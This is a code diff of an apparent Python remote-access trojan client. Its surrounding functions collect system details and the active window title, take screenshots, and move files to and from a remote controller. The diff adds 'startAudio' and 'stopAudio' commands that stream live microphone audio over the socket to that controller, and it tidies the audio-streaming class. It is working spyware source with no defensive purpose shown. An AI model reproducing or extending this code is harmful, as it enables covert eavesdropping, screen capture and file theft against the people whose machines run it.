@@ -82,6 +82,7 @@ def PCINFO():
         'activewindowtitle': GetWindowTitle(),
     })
 
+
 def SCREENSHOT():
     return str({
         'screenshot': ScreenBITS(),
@@ -112,6 +113,7 @@ def Receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
     else:
         return 'info', ''
 
+
 def upload(sock, filename, end="[ENDOFMESSAGE]"):
     if not os.path.exists(filename):
         return 'fileExistsError'
@@ -128,6 +130,7 @@ def upload(sock, filename, end="[ENDOFMESSAGE]"):
                     break
             return 'uploadDone'
     return 'uploadError'
+
 
 def download(sock, filename, end="[ENDOFMESSAGE]"):
     recievedData = ''
@@ -246,6 +249,18 @@ class childSocket(threading.Thread):
                         stdoutput = upload(self.socket, filename)
                     except:
                         stdoutput = 'downloadError'
+                elif data.startswith('startAudio'):
+                    print 'init audio thread'
+                    audioThread = audioStreaming(self.socket)
+                    audioThread.start()
+                    stdoutput = 'audioStarted'
+                elif data.startswith('stopAudio'):
+                    if audioThread:
+                        audioThread.active = False
+                        stdoutput = 'audioStopped'
+                    else:
+                        stdoutput = 'audioStoppedError'
+                    print stdoutput
                 elif data.startswith("cd"):
                     try:
                         os.chdir(data[3:])
@@ -278,8 +293,8 @@ class childSocket(threading.Thread):
             except socket.error:
                 return
 
-class audioStreaming(threading.Thread):
 
+class audioStreaming(threading.Thread):
     def __init__(self, sock):
         super(audioStreaming, self).__init__()
 
@@ -293,20 +308,19 @@ class audioStreaming(threading.Thread):
 
         self.p = pyaudio.PyAudio()
 
-        self.stream = self.p.open(format=self.format,
-                                  channels=self.channel,
-                                  rate=self.rate,
-                                  input=True,
+        self.stream = self.p.open(format=self.format, channels=self.channel, rate=self.rate, input=True,
                                   frames_per_buffer=self.chunk)
 
     def run(self):
         while self.active:
             try:
                 data = self.stream.read(self.chunk)
-                Send(self.sock, data, 'audiostreaming')
+                self.sock.sendall(data)
             except socket.error:
                 self.active = False
+                break
 
+        print 'terminating'
         self.stream.close()
         self.p.terminate()
 
